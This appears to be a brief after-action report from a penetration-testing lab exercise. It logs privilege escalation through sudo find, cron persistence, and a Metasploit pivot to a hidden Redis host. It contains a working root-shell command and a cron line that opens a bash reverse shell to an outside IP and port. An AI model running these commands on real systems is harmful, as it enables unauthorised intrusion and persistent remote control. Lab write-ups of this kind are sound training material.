# OPERATION DEEP PIVOT: AFTER ACTION REPORT 
**Operator:** Sefat E Monzor 

## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** Mercenary 
* **Vulnerable Sudo Binary:**  /usr/bin/find
* **GTFOBins Exploit Command Used:** sudo find . -exec /bin/sh ;

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.211/4444 0>&1'
* **Persistence Confirmed:** Yes

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** exploit/multi/handler, post/multi/manage/autoroute, auxiliary/server/socks_proxy
* **Hidden Database IP Discovered:** 10.0.10.50
* **Open Port on Hidden Database:**  6379 Redis
